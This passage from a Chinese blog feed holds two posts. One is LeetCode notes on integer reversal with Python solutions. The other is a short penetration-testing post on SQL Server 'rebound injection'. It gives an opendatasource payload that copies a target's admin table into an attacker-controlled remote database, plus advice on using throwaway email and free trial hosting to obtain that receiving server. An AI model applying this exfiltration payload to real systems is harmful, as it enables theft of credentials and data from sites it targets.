        <content type="html"><![CDATA[<h2 id="LeetCode刷题笔记"><a href="#LeetCode刷题笔记" class="headerlink" title="LeetCode刷题笔记"></a>LeetCode刷题笔记</h2><h3 id="整数反转"><a href="#整数反转" class="headerlink" title="整数反转"></a>整数反转</h3><p><strong>题目链接：<a href="https://leetcode-cn.com/problems/reverse-integer/" target="_blank" rel="noopener">https://leetcode-cn.com/problems/reverse-integer/</a></strong></p><hr><blockquote><p>给出一个 32 位的有符号整数，你需要将这个整数中每位上的数字进行反转。<br><a id="more"></a><br>示例 1:<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">输入: 123</span></span><br><span class="line"><span class="section">输出: 321</span></span><br></pre></td></tr></table></figure></p></blockquote><p> 示例 2:<br> <figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> 输入: <span class="string">-123</span></span><br><span class="line">输出: <span class="string">-321</span></span><br></pre></td></tr></table></figure></p><p>示例 3:<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">输入: 120</span></span><br><span class="line"><span class="section">输出: 21</span></span><br></pre></td></tr></table></figure></p><blockquote><p>注意:<br>假设我们的环境只能存储得下 32 位的有符号整数，则其数值范围为 [−2^31,  2^31 − 1]。请根据这个假设，如果反转后整数溢出那么就返回 0。</p></blockquote><hr><h4 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h4><blockquote><p>首先是我自己写的代码，很朴素的思想，通用性很差，写了很多的if、else来处理异常状况</p></blockquote><table><thead><tr><th>提交结果</th><th>执行用时</th><th>内存消耗</th><th>语言</th></tr></thead><tbody><tr><td>通过</td><td>48 ms</td><td>13.8 MB</td><td>Python3</td></tr></tbody></table><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def <span class="built_in">reverse</span>(self, <span class="keyword">x</span>: <span class="keyword">int</span>) -&gt; in<span class="variable">t:</span></span><br><span class="line">        strx = str(<span class="keyword">x</span>)</span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        length = <span class="built_in">len</span>(strx)</span><br><span class="line">        listx = <span class="keyword">list</span>(strx)</span><br><span class="line">        <span class="keyword">if</span>(listx[<span class="number">0</span>]== <span class="string">"-"</span> <span class="built_in">and</span> length == <span class="number">2</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">x</span></span><br><span class="line">        elif((<span class="keyword">x</span>&gt;<span class="number">2147483647</span>) <span class="built_in">or</span> <span class="keyword">x</span>&lt;-<span class="number">2147483648</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        elif(length == <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">x</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span>(listx[<span class="number">0</span>]==<span class="string">"-"</span>):</span><br><span class="line">                listx.<span class="keyword">pop</span>(<span class="number">0</span>)</span><br><span class="line">                length = <span class="built_in">len</span>(listx)</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">            <span class="keyword">for</span> <span class="keyword">number</span> in <span class="built_in">range</span>(<span class="keyword">int</span>((length)/<span class="number">2</span>)):</span><br><span class="line">                temp = listx[<span class="keyword">number</span>]</span><br><span class="line">                listx[<span class="keyword">number</span>] = listx[-(<span class="keyword">number</span>+<span class="number">1</span>)]</span><br><span class="line">                listx[-(<span class="keyword">number</span>+<span class="number">1</span>)] = temp</span><br><span class="line">            n = <span class="number">0</span>           </span><br><span class="line">            <span class="keyword">for</span> i,<span class="keyword">number</span> in enumerate(listx):</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">number</span> == <span class="string">"0"</span>):</span><br><span class="line">                    n = n + <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">for</span> i in <span class="built_in">range</span>(n):</span><br><span class="line">                listx.<span class="keyword">pop</span>(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">if</span>(flag == <span class="number">1</span>):</span><br><span class="line">                listx.<span class="keyword">insert</span>(<span class="number">0</span>,<span class="string">"-"</span>)</span><br><span class="line">                flag = <span class="number">0</span></span><br><span class="line">            <span class="keyword">x</span>=<span class="string">""</span>.<span class="keyword">join</span>(listx)</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">int</span>(<span class="keyword">x</span>)&gt;<span class="number">2147483647</span> <span class="built_in">or</span> <span class="keyword">int</span>(<span class="keyword">x</span>)&lt;-<span class="number">2147483648</span>):</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">x</span></span><br></pre></td></tr></table></figure><blockquote><p>算法思路： 为对当前数取对 10的余数，再一项项填入res尾部，即可完成 int 翻转。<br>Python： 存储数字理论上是无限长度，因此每次计算完后判断res与of的大小关系即可；<br>Python的坑： 由于Python的 // 操作是向下取整，导致正负数取余 % 操作结果不一致，因此需要将原数字转为正数操作。<br> 1&lt;&lt;31    = 2147483648<br>(1&lt;&lt;31)-1= 2147483647<br> of = (1 &lt;&lt; 31) - 1 if x &gt; 0 else 1 &lt;&lt; 31<br> 即如果x&gt;0 of = 2147483647 x&lt;0 of = 2147483648<br>| 提交结果 | 执行用时 | 内存消耗 | 语言    |<br>| ——– | ——– | ——– | ——- |<br>| 通过     | 36 ms    | 13.8 MB  | Python3 |<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def <span class="built_in">reverse</span>(self, <span class="keyword">x</span>: <span class="keyword">int</span>) -&gt; in<span class="variable">t:</span></span><br><span class="line">        <span class="keyword">y</span>, <span class="keyword">res</span> = <span class="built_in">abs</span>(<span class="keyword">x</span>), <span class="number">0</span></span><br><span class="line">        of = (<span class="number">1</span> &lt;&lt; <span class="number">31</span>) - <span class="number">1</span> <span class="keyword">if</span> <span class="keyword">x</span> &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="number">1</span> &lt;&lt; <span class="number">31</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">y</span> != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">res</span> = <span class="keyword">res</span> * <span class="number">10</span> + <span class="keyword">y</span> % <span class="number">10</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">res</span> &gt; of: <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">            <span class="keyword">y</span> //= <span class="number">10</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">res</span> <span class="keyword">if</span> <span class="keyword">x</span> &gt; <span class="number">0</span> <span class="keyword">else</span> -<span class="keyword">res</span></span><br></pre></td></tr></table></figure></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> LeetCode刷题笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode刷题笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQLSever的反弹注入</title>
      <link href="/2019/10/14/sqlsever%E5%8F%8D%E5%BC%B9%E6%B3%A8%E5%85%A5/"/>
      <url>/2019/10/14/sqlsever%E5%8F%8D%E5%BC%B9%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>主要是利用opendatasource函数，这个函数说白了就是把在某一个数据库查询的结果传输到另一个数据库的某个表中，但是有一个限制条件，就是接受数据的表的字段数必须和查询数据的表的字段数相同。</p><p>这种注入方式适用于没有回显的，注入工具注入不进去并且过于缓慢的（所以可以说是一种骚姿势？）<br><a id="more"></a><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> opendatasource(<span class="string">'sqloledb'</span>,<span class="string">'server=服务器;uid=登陆的用户名;pwd=登陆的密码;database=数据库名'</span>).数据库名.dbo.数据库中的表名 <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span><span class="comment">--</span></span><br></pre></td></tr></table></figure></p><blockquote><p>select * from admin –</p></blockquote><p>是可以自定义的sql语句，但是要注意在sqlsever中#不能注释，要用–才可以</p><p>这个可以说是一个小知识点，但是有要求，需要接收数据的数据库有自己的公网ip。所以可以用十分钟邮箱</p><p><a href="http://note.youdao.com/" target="_blank" rel="noopener">http://24mail.chacuo.net/</a></p><p>到香港云注册一个新账号，香港云新账号可以试用一个60天的虚拟空间，虚拟空间有公网ip和sqlsever、mysql数据库，这样就可以不本地安装了</p><p>香港云<a href="http://note.youdao.com/" target="_blank" rel="noopener">http://www.webweb.com</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
